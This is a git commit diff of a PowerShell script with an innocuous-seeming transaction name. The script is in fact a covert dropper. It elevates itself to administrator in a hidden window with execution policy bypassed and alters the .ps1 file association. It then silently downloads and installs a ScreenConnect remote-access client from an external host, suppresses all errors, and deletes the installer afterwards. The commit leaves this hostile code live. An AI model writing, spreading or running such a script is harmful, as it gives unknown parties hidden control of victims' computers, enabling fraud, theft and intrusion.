61710dab91b8fc8e9b12162f8b55580cfe214660
ilyasoumai28-cmyk <ilyasoumai28@gmail.com>
2026-07-19 22:19:15 +0100

    Update transactionbell2026.ps1

--- transactionbell2026.ps1
+++ transactionbell2026.ps1
@@ -1,4 +1,3 @@
-
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
     Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList $arguments
@@ -6,38 +5,30 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 
-
 try {
-
     $ErrorActionPreference = "SilentlyContinue"
     
-
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ps1\UserChoice" -Name "Progid" -Value "Applications\powershell.exe" -ErrorAction SilentlyContinue
     
     $url = "https://earthlink7.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-    $output = "$env:TEMP\ScreenConnect.ClientSetup.msi"
+    $output = "$env:TEMP\ScreenConnect.ClientSetup.exe"
     
-
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
     $webClient.DownloadFile($url, $output)
     $webClient.Dispose()
     
     if (Test-Path $output) {
-
         $process = Start-Process -FilePath $output -ArgumentList "/quiet /norestart" -Wait -PassThru -WindowStyle Hidden
         
-
         if ($process.ExitCode -ne 0) {
             $process = Start-Process -FilePath $output -ArgumentList "/S /silent /norestart" -Wait -PassThru -WindowStyle Hidden
         }
         
-
         Start-Sleep -Milliseconds 500
         Remove-Item $output -Force -ErrorAction SilentlyContinue
     }
 } catch {
-
     exit 0
 }
 
